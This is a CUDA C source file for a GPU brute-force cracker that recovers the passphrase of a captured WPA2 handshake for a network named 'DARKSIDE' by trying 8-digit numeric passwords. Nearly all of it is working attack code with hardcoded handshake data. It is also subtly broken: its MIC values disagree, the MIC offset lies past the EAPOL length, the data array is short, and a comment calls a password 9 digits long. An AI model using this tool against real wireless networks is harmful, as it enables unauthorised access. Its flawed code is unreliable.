/*
 * CUDA Brute-Force MIC Cracker for WPA2 Handshake
 * SSID: DARKSIDE
 * MIC target: 311a91a4944e6f4bb8c478893a698966
 *
 * Includes:
 * - SHA1
 * - HMAC-SHA1
 * - PBKDF2
 * - PRF
 * - MIC verification
 * - Brute-force kernel
 */

#include <stdio.h>
#include <cuda_runtime.h>
#include <string.h>
#include <stdbool.h>

// Constants
#define SHA1_BLOCK_SIZE 20
#define SHA1_PAD_SIZE 64
#define SSID "DARKSIDE"
#define SSID_LEN 8
#define MIC_OFFSET 0x81
#define EAPOL_LEN 121
#define MIN(a,b) ((a)<(b)?(a):(b))

// DEVICE CONSTANTS (handshake parts)
__device__ const unsigned char bssid[6] = {0xc4,0xe9,0x84,0xa6,0x11,0xe8};
__device__ const unsigned char client_mac[6] = {0xaa,0xbb,0xde,0x1d,0x2f,0x2a};
__device__ const unsigned char anonce[32] = {
    0x77,0xaa,0x3e,0xfc,0x09,0x7d,0x5a,0x84,0xd9,0x66,0x00,0xc2,0x30,0x0f,0x7e,0xd2,
    0x5c,0x57,0x72,0xce,0xee,0x6e,0x90,0x47,0x5e,0xe7,0x13,0x51,0x2d,0xdb,0xa5,0x26
};
__device__ const unsigned char snonce[32] = {
    0xd5,0x23,0x33,0xb1,0xe6,0xca,0xfe,0x88,0xce,0x95,0x99,0x50,0x8e,0x18,0x80,0xd9,
    0xdc,0xd1,0xcf,0xb4,0x42,0x53,0xb3,0xf4,0x4d,0x6c,0x8b,0x45,0x5c,0x4b,0x3d,0xde
};
__device__ const unsigned char eapol[EAPOL_LEN] = {
    0x01,0x03,0x00,0x75,0x02,0x01,0x0a,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x01,0xd5,0x23,0x33,0xb1,0xe6,0xca,0xfe,0x88,0xce,0x95,0x99,0x50,0x8e,0x18,0x80,
    0xd9,0xdc,0xd1,0xcf,0xb4,0x42,0x53,0xb3,0xf4,0x4d,0x6c,0x8b,0x45,0x5c,0x4b,0x3d,
    0xde,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x16,0x30,0x14,0x01,0x00,0x00,0x0f,0xac,0x04,0x01,0x00,0x00,0x0f,0xac,
    0x04,0x01,0x00,0x00,0x0f,0xac,0x02,0x0c,0x00
};

// SHA1, HMAC-SHA1, PBKDF2, PRF, brute-force kernel and host logic
// === TO BE FILLED IN ===
// (Because of length, this code block only sets the framework — the full implementation will be appended in next blocks)
void run_brute_force(unsigned char* target_mic);

int main() {
    // MIC for password "244466666"
    const char* known_hex_mic = "ecb1353d774d5e519c42fe1eff6570af";
    unsigned char target_mic[16];
    for (int i = 0; i < 16; i++) {
        sscanf(&known_hex_mic[i * 2], "%2hhx", &target_mic[i]);
    }

     run_brute_force(target_mic);  // Call brute force logic

    return 0;
}


// SHA1 implementation supporting multiple blocks
__device__ void sha1_cuda(const unsigned char* message, int len, unsigned char* digest) {
    unsigned int h0 = 0x67452301;
    unsigned int h1 = 0xEFCDAB89;
    unsigned int h2 = 0x98BADCFE;
    unsigned int h3 = 0x10325476;
    unsigned int h4 = 0xC3D2E1F0;

    int total_len = len + 1 + 8;
    int padded_len = ((total_len + 63) / 64) * 64;

    unsigned char padded[256] = {0};
    for (int i = 0; i < len; i++) padded[i] = message[i];
    padded[len] = 0x80;
    unsigned long long bit_len = (unsigned long long)len * 8;
    for (int i = 0; i < 8; i++) padded[padded_len - 1 - i] = (bit_len >> (8 * i)) & 0xff;

    for (int block = 0; block < padded_len; block += 64) {
        unsigned int w[80];
        for (int i = 0; i < 16; i++) {
            w[i] = (padded[block + i * 4] << 24) |
                   (padded[block + i * 4 + 1] << 16) |
                   (padded[block + i * 4 + 2] << 8) |
                   (padded[block + i * 4 + 3]);
        }
        for (int i = 16; i < 80; i++) {
            unsigned int val = w[i - 3] ^ w[i - 8] ^ w[i - 14] ^ w[i - 16];
            w[i] = (val << 1) | (val >> 31);
        }

        unsigned int a = h0, b = h1, c = h2, d = h3, e = h4;
        for (int i = 0; i < 80; i++) {
            unsigned int f, k;
            if (i < 20) { f = (b & c) | ((~b) & d); k = 0x5A827999; }
            else if (i < 40) { f = b ^ c ^ d; k = 0x6ED9EBA1; }
            else if (i < 60) { f = (b & c) | (b & d) | (c & d); k = 0x8F1BBCDC; }
            else { f = b ^ c ^ d; k = 0xCA62C1D6; }

            unsigned int temp = ((a << 5) | (a >> 27)) + f + e + k + w[i];
            e = d; d = c; c = (b << 30) | (b >> 2); b = a; a = temp;
        }

        h0 += a; h1 += b; h2 += c; h3 += d; h4 += e;
    }

    digest[0] = h0 >> 24; digest[1] = h0 >> 16; digest[2] = h0 >> 8; digest[3] = h0;
    digest[4] = h1 >> 24; digest[5] = h1 >> 16; digest[6] = h1 >> 8; digest[7] = h1;
    digest[8] = h2 >> 24; digest[9] = h2 >> 16; digest[10] = h2 >> 8; digest[11] = h2;
    digest[12] = h3 >> 24; digest[13] = h3 >> 16; digest[14] = h3 >> 8; digest[15] = h3;
    digest[16] = h4 >> 24; digest[17] = h4 >> 16; digest[18] = h4 >> 8; digest[19] = h4;
}

__device__ void hmac_sha1_cuda(const unsigned char* key, int key_len, const unsigned char* msg, int msg_len, unsigned char* out_digest) {
    unsigned char k_ipad[SHA1_PAD_SIZE], k_opad[SHA1_PAD_SIZE];
    for (int i = 0; i < SHA1_PAD_SIZE; i++) {
        k_ipad[i] = (i < key_len ? key[i] : 0x00) ^ 0x36;
        k_opad[i] = (i < key_len ? key[i] : 0x00) ^ 0x5c;
    }
    unsigned char inner[SHA1_PAD_SIZE + 512], inner_hash[SHA1_BLOCK_SIZE];
    for (int i = 0; i < SHA1_PAD_SIZE; i++) inner[i] = k_ipad[i];
    for (int i = 0; i < msg_len; i++) inner[SHA1_PAD_SIZE + i] = msg[i];
    sha1_cuda(inner, SHA1_PAD_SIZE + msg_len, inner_hash);

    unsigned char outer[SHA1_PAD_SIZE + SHA1_BLOCK_SIZE];
    for (int i = 0; i < SHA1_PAD_SIZE; i++) outer[i] = k_opad[i];
    for (int i = 0; i < SHA1_BLOCK_SIZE; i++) outer[SHA1_PAD_SIZE + i] = inner_hash[i];
    sha1_cuda(outer, SHA1_PAD_SIZE + SHA1_BLOCK_SIZE, out_digest);
}

__device__ void pbkdf2_sha1_cuda(const char* pass, int pass_len, const unsigned char* ssid, int ssid_len, unsigned char* output, int dklen) {
    const int blocks = (dklen + SHA1_BLOCK_SIZE - 1) / SHA1_BLOCK_SIZE;
    for (int b = 1; b <= blocks; b++) {
        unsigned char U[SHA1_BLOCK_SIZE], T[SHA1_BLOCK_SIZE], msg[64];
        for (int i = 0; i < ssid_len; i++) msg[i] = ssid[i];
        msg[ssid_len + 0] = (b >> 24) & 0xff;
        msg[ssid_len + 1] = (b >> 16) & 0xff;
        msg[ssid_len + 2] = (b >> 8) & 0xff;
        msg[ssid_len + 3] = (b >> 0) & 0xff;
        hmac_sha1_cuda((const unsigned char*)pass, pass_len, msg, ssid_len + 4, U);
        for (int i = 0; i < SHA1_BLOCK_SIZE; i++) T[i] = U[i];
        for (int i = 1; i < 4096; i++) {
            hmac_sha1_cuda((const unsigned char*)pass, pass_len, U, SHA1_BLOCK_SIZE, U);
            for (int j = 0; j < SHA1_BLOCK_SIZE; j++) T[j] ^= U[j];
        }
        for (int j = 0; j < SHA1_BLOCK_SIZE && (j + (b - 1) * SHA1_BLOCK_SIZE) < dklen; j++)
            output[(b - 1) * SHA1_BLOCK_SIZE + j] = T[j];
    }
}

__device__ void prf_cuda(const unsigned char* key, int key_len, const char* label, const unsigned char* data, int data_len, unsigned char* out, int out_len) {
    int pos = 0, counter = 1;
    unsigned char digest[SHA1_BLOCK_SIZE];
    while (pos < out_len) {
        unsigned char input[128];
        int len = 0;
        for (int i = 0; i < 22; i++) input[len++] = label[i];
        input[len++] = 0x00;
        for (int i = 0; i < data_len; i++) input[len++] = data[i];
        input[len++] = counter;
        hmac_sha1_cuda(key, key_len, input, len, digest);
        int copy_len = MIN(SHA1_BLOCK_SIZE, out_len - pos);
        for (int i = 0; i < copy_len; i++) out[pos++] = digest[i];
        counter++;
    }
}

__global__ void brute_force_kernel(unsigned char* target_mic, char* found_password, bool* found_flag, unsigned long long start, int batch_size) {
    int idx = blockIdx.x * blockDim.x + threadIdx.x;
    unsigned long long attempt = start + idx;

    if (idx >= batch_size || *found_flag) return;

    char pwd[9];
    pwd[8] = '\0';
    for (int i = 7; i >= 0; i--) {
        pwd[i] = '0' + (attempt % 10);
        attempt /= 10;
    }

    unsigned char pmk[32], tmp_eapol[512], ptk[64], mic[20], data[128];
    int offset = 0;
    const char* label = "Pairwise key expansion";

    pbkdf2_sha1_cuda(pwd, 8, (const unsigned char*)SSID, SSID_LEN, pmk, 32);

    for (int i = 0; i < 6; i++) data[offset++] = bssid[i];
    for (int i = 0; i < 6; i++) data[offset++] = client_mac[i];
    for (int i = 0; i < 32; i++) data[offset++] = anonce[i];
    for (int i = 0; i < 32; i++) data[offset++] = snonce[i];

    prf_cuda(pmk, 32, label, data, offset, ptk, 64);

    for (int i = 0; i < EAPOL_LEN; i++) tmp_eapol[i] = eapol[i];
    for (int i = MIC_OFFSET; i < MIC_OFFSET + 16; i++) tmp_eapol[i] = 0x00;

    hmac_sha1_cuda(ptk, 16, tmp_eapol, EAPOL_LEN, mic);

    bool match = true;
    for (int i = 0; i < 16; i++) {
        if (mic[i] != target_mic[i]) {
            match = false;
            break;
        }
    }

    if (match) {
        for (int i = 0; i < 8; i++) found_password[i] = pwd[i];
        *found_flag = true;
    }
}

void run_brute_force(unsigned char* target_mic) {
    const int batch_size = 1024 * 64;
    const int max_threads = 256;

    char* d_found_password;
    bool* d_found_flag;
    unsigned char* d_target_mic;

    char h_found_password[9] = {0};
    bool h_found_flag = false;

    cudaMalloc(&d_found_password, 9);
    cudaMalloc(&d_found_flag, sizeof(bool));
    cudaMalloc(&d_target_mic, 16);
    cudaMemcpy(d_target_mic, target_mic, 16, cudaMemcpyHostToDevice);
    cudaMemcpy(d_found_flag, &h_found_flag, sizeof(bool), cudaMemcpyHostToDevice);

    unsigned long long start = 0;

    while (!h_found_flag && start < 100000000ULL) {
        int blocks = (batch_size + max_threads - 1) / max_threads;
        brute_force_kernel<<<blocks, max_threads>>>(d_target_mic, d_found_password, d_found_flag, start, batch_size);
        cudaDeviceSynchronize();

        cudaMemcpy(&h_found_flag, d_found_flag, sizeof(bool), cudaMemcpyDeviceToHost);
        if (h_found_flag) {
            cudaMemcpy(h_found_password, d_found_password, 8, cudaMemcpyDeviceToHost);
            printf("Lozinka pronadjena: %s\n", h_found_password);
            break;
        }

        start += batch_size;
        printf("Provjereno do: %llu\n", start);
    }

    if (!h_found_flag) {
        printf("Lozinka nije pronadjena.\n");
    }

    cudaFree(d_found_password);
    cudaFree(d_found_flag);
    cudaFree(d_target_mic);
}